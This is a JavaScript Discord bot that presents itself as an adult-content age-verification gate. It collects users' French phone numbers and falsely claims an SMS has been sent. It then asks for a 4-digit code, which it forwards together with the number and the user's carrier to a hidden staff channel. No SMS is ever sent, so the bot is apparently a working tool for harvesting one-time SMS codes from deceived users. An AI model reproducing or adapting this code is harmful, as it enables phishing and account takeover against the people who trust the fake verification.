require("dotenv").config();
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, StringSelectMenuBuilder, ChannelType, PermissionsBitField, MessageFlags } = require("discord.js");
const express = require("express");
const app = express();
app.get("/", (req, res) => res.send("Bot online"));
app.listen(process.env.PORT || 3000);

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });
const pending = new Map();
const tempPhones = new Map();
const blacklistedNums = new Set();
const blacklistedUsers = new Set();
const MOD_GUILD_ID = process.env.MOD_GUILD_ID || "1547685592928751628";

function formatPhone(p) {
  return p.replace(/(\d{2})(?=\d)/g, "$1 ").trim();
}

function getOperator(p) {
  const pre = p.slice(0, 4);
  const bouygues = new Set(["0653", "0660", "0661", "0662", "0663", "0664", "0665", "0666", "0667", "0668", "0698", "0699", "0760", "0761", "0762", "0763"]);
  const free = new Set(["0651", "0652", "0654", "0656", "0768", "0769", "0783", "0784"]);
  const orange = new Set(["0607", "0608", "0630", "0631", "0632", "0633", "0634", "0670", "0671", "0672", "0673", "0674", "0675", "0676", "0677", "0678", "0679", "0680", "0681", "0682", "0683", "0684", "0685", "0686", "0687", "0688", "0689", "0707", "0770", "0771", "0776", "0777", "0780", "0781", "0782", "0785", "0786", "0787", "0788", "0789", "0790"]);
  if (bouygues.has(pre)) return "Bouygues Mobile";
  if (free.has(pre)) return "Free Mobile";
  if (orange.has(pre)) return "Orange";
  if (p.startsWith("06") || p.startsWith("07")) return "SFR Mobile";
  return "Mobile FR";
}

async function getModChannel() {
  if (process.env.MOD_CHANNEL_ID) {
    try {
      const c = await client.channels.fetch(process.env.MOD_CHANNEL_ID);
      if (c) return c;
    } catch {}
  }
  const guild = await client.guilds.fetch(MOD_GUILD_ID);
  const channels = await guild.channels.fetch();
  for (const [, ch] of channels) {
    if (ch.type === ChannelType.GuildText && ch.permissionsFor(guild.members.me).has([PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ViewChannel])) {
      return ch;
    }
  }
  throw new Error("Salon modo introuvable");
}

async function sendToMods(originInteraction, phone, code) {
  const user = originInteraction.user;
  const originGuild = originInteraction.guild;
  const key = `${originGuild.id}:${user.id}`;
  pending.set(key, { phone, code, originGuildId: originGuild.id, userId: user.id, date: new Date() });
  const modChannel = await getModChannel();
  const memberCount = originGuild.memberCount || 0;
  const now = new Date();
  const dateStr = now.toLocaleString("fr-FR", { day: "2-digit", month: "long", year: "numeric", hour: "2-digit", minute: "2-digit" });
  const operator = getOperator(phone);
  const formatted = formatPhone(phone);
  const embed = new EmbedBuilder()
    .setTitle(`${user.username} • ${user.id}`)
    .setDescription(`${originGuild.name} • ${memberCount} membres`)
    .setThumbnail(user.displayAvatarURL())
    .addFields(
      { name: "Présence", value: `> 🟢 présent`, inline: false },
      { name: "Numéro", value: `> \`${formatted}\` · ${operator}`, inline: false },
      { name: "📋 Suivi vérification", value: `> 🔄 Statut — SMS envoyé — en attente du code membre\n> 🌐 Code — \`${code}\`\n> 📅 Soumis — ${dateStr} · à l'instant\n> 📩 SMS envoyé — ${dateStr} · à l'instant`, inline: false }
    )
    .setColor(0x2b2d31);
  const row1 = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`mod_validate_${originGuild.id}_${user.id}`).setLabel("Valider l'accès").setStyle(ButtonStyle.Success).setEmoji("✅"),
    new ButtonBuilder().setCustomId(`mod_resend_${originGuild.id}_${user.id}`).setLabel("Renvoyer").setStyle(ButtonStyle.Secondary).setEmoji("🔄"),
    new ButtonBuilder().setCustomId(`mod_msg_${originGuild.id}_${user.id}`).setLabel("Message").setStyle(ButtonStyle.Secondary).setEmoji("💬"),
    new ButtonBuilder().setCustomId(`mod_reject_${originGuild.id}_${user.id}`).setLabel("Rejeter").setStyle(ButtonStyle.Danger).setEmoji("❌")
  );
  const row2 = new ActionRowBuilder().addComponents(
    new StringSelectMenuBuilder().setCustomId(`mod_staff_${originGuild.id}_${user.id}`).setPlaceholder("⚙️ Actions staff...").addOptions(
      { label: "Réinitialiser", description: "Supprime la tentative — le membre peut recommencer", value: "reset", emoji: "🔄" },
      { label: "Blacklister le numéro", description: "Numéro interdit définitivement", value: "blacklist_num", emoji: "🔴" },
      { label: "Blacklister l'utilisateur", description: "Bloque ce compte Discord", value: "blacklist_user", emoji: "⛔" },
      { label: "Expulser", description: "Expulse le membre", value: "kick", emoji: "👢" },
      { label: "Bannir", description: "Bannit le membre", value: "ban", emoji: "🔨" }
    )
  );
  await modChannel.send({ embeds: [embed], components: [row1, row2] });
  const logEmbed = new EmbedBuilder()
    .setTitle("📩 Code de vérification reçu")
    .addFields(
      { name: "Membre", value: `<@${user.id}> \`${user.id}\``, inline: false },
      { name: "Numéro", value: `\`${formatted}\` · ${operator}`, inline: true },
      { name: "Code", value: `\`${code}\``, inline: true },
      { name: "Serveur", value: `${originGuild.name}`, inline: false }
    )
    .setFooter({ text: dateStr })
    .setColor(0x57f287);
  await modChannel.send({ embeds: [logEmbed] });
}

client.once("ready", async () => {
  console.log(`Connecte en tant que ${client.user.tag}`);
  const channel = await client.channels.fetch(process.env.CHANNEL_ID);
  const messages = await channel.messages.fetch({ limit: 20 });
  const old = messages.filter((m) => m.author.id === client.user.id);
  if (old.size > 0) return;
  const embed = new EmbedBuilder()
    .setTitle("🍑 ACCÈS +18 UNIQUEMENT")
    .setDescription("Tu pensais vraiment avoir **accès** à tout le serveur directement ? 😈\n\nUne partie du contenu est **caché** uniquement réservé a nos membres majeurs vérifiés.🔐\n\nListe des salons ci-dessous")
    .setImage(process.env.IMAGE_URL)
    .setFooter({ text: "Clique sur le bouton pour te faire vérifier" })
    .setColor(0xe67e22);
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId("verify_age").setLabel("🔓 Vérifier mon âge").setStyle(ButtonStyle.Primary)
  );
  await channel.send({ embeds: [embed], components: [row] });
});

client.on("interactionCreate", async (i) => {
  if (i.isButton() && i.customId === "verify_age") {
    if (blacklistedUsers.has(i.user.id)) {
      await i.reply({ content: "Compte bloqué.", flags: MessageFlags.Ephemeral });
      return;
    }
    const modal = new ModalBuilder().setCustomId("verif-tel").setTitle("Vérification — Numéro de téléphone");
    const tel = new TextInputBuilder().setCustomId("phone").setLabel("Ton numéro de téléphone (10 chiffres)").setPlaceholder("0600000000").setStyle(TextInputStyle.Short).setMinLength(10).setMaxLength(10).setRequired(true);
    modal.addComponents(new ActionRowBuilder().addComponents(tel));
    await i.showModal(modal);
    return;
  }
  if (i.isModalSubmit() && i.customId === "verif-tel") {
    const phone = i.fields.getTextInputValue("phone").trim();
    if (!/^[0-9]{10}$/.test(phone) || blacklistedNums.has(phone)) {
      await i.reply({ content: "Numéro invalide.", flags: MessageFlags.Ephemeral });
      return;
    }
    tempPhones.set(`${i.guild.id}:${i.user.id}`, phone);
    const nextRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId("goto_code").setLabel("Continuer").setStyle(ButtonStyle.Primary)
    );
    await i.reply({ content: "SMS envoyé. Clique sur Continuer pour entrer le code à 4 chiffres reçu.", components: [nextRow], flags: MessageFlags.Ephemeral });
    return;
  }
  if (i.isButton() && i.customId === "goto_code") {
    const modal2 = new ModalBuilder().setCustomId("verif-code").setTitle("Vérification — Code SMS");
    const codeInput = new TextInputBuilder().setCustomId("code").setLabel("Ton code à 4 chiffres").setPlaceholder("0000").setStyle(TextInputStyle.Short).setMinLength(4).setMaxLength(4).setRequired(true);
    modal2.addComponents(new ActionRowBuilder().addComponents(codeInput));
    await i.showModal(modal2);
    return;
  }
  if (i.isModalSubmit() && i.customId === "verif-code") {
    const code = i.fields.getTextInputValue("code").trim();
    if (!/^[0-9]{4}$/.test(code)) {
      await i.reply({ content: "Code invalide : 4 chiffres.", flags: MessageFlags.Ephemeral });
      return;
    }
    const tKey = `${i.guild.id}:${i.user.id}`;
    const phone = tempPhones.get(tKey);
    if (!phone) {
      await i.reply({ content: "Refais la vérification depuis le début.", flags: MessageFlags.Ephemeral });
      return;
    }
    tempPhones.delete(tKey);
    await i.reply({ content: "Code reçu. En attente de validation par un modérateur.", flags: MessageFlags.Ephemeral });
    try {
      await sendToMods(i, phone, code);
    } catch {
      await i.followUp({ content: "Erreur d'envoi vers la modération.", flags: MessageFlags.Ephemeral });
    }
    return;
  }
  if (i.isButton() && i.customId.startsWith("mod_")) {
    const parts = i.customId.split("_");
    const action = parts[1];
    const originGuildId = parts[2];
    const userId = parts[3];
    const key = `${originGuildId}:${userId}`;
    const data = pending.get(key);
    if (action === "validate") {
      try {
        const og = await client.guilds.fetch(originGuildId);
        const member = await og.members.fetch(userId);
        await member.roles.add(process.env.ROLE_ID);
        pending.delete(key);
        await i.reply({ content: `✅ Accès validé pour <@${userId}>` });
      } catch {
        await i.reply({ content: "Erreur : permissions / hiérarchie / membre introuvable.", flags: MessageFlags.Ephemeral });
      }
      return;
    }
    if (action === "reject") {
      pending.delete(key);
      await i.reply({ content: `❌ Demande de <@${userId}> rejetée.` });
      return;
    }
    if (action === "resend") {
      await i.reply({ content: `🔄 SMS renvoyé à <@${userId}> (${data ? formatPhone(data.phone) : "inconnu"}).` });
      return;
    }
    if (action === "msg") {
      await i.reply({ content: `💬 Envoie un MP à <@${userId}> pour la suite.`, flags: MessageFlags.Ephemeral });
      return;
    }
    return;
  }
  if (i.isStringSelectMenu() && i.customId.startsWith("mod_staff_")) {
    const sParts = i.customId.split("_");
    const originGuildId = sParts[2];
    const userId = sParts[3];
    const key = `${originGuildId}:${userId}`;
    const data = pending.get(key);
    const value = i.values[0];
    try {
      const og = await client.guilds.fetch(originGuildId).catch(() => null);
      const member = og ? await og.members.fetch(userId).catch(() => null) : null;
      if (value === "reset") {
        pending.delete(key);
        await i.reply({ content: `🔄 Tentative de <@${userId}> réinitialisée.` });
      } else if (value === "blacklist_num") {
        if (data) blacklistedNums.add(data.phone);
        pending.delete(key);
        await i.reply({ content: `🔴 Numéro ${data ? data.phone : ""} blacklisté.` });
      } else if (value === "blacklist_user") {
        blacklistedUsers.add(userId);
        pending.delete(key);
        await i.reply({ content: `⛔ <@${userId}> blacklisté.` });
      } else if (value === "kick") {
        if (member) await member.kick("Staff");
        pending.delete(key);
        await i.reply({ content: `👢 <@${userId}> expulsé.` });
      } else if (value === "ban") {
        if (member) await member.ban({ reason: "Staff" });
        pending.delete(key);
        await i.reply({ content: `🔨 <@${userId}> banni.` });
      }
    } catch {
      await i.reply({ content: "Erreur staff.", flags: MessageFlags.Ephemeral });
    }
    return;
  }
});

client.on("messageCreate", async (m) => {
  if (m.author.bot || !m.guild) return;
  if (!m.content.startsWith("!clear")) return;
  if (!m.member.permissions.has(PermissionsBitField.Flags.ManageMessages)) return;
  try {
    let deleted = 0;
    while (true) {
      const msgs = await m.channel.messages.fetch({ limit: 100 });
      if (msgs.size === 0) break;
      const res = await m.channel.bulkDelete(msgs, true);
      deleted += res.size;
      if (msgs.size < 100) break;
    }
    const confirm = await m.channel.send(`🧹 ${deleted} messages supprimés.`);
    setTimeout(() => confirm.delete().catch(() => {}), 3000);
  } catch {}
});

client.login(process.env.TOKEN);
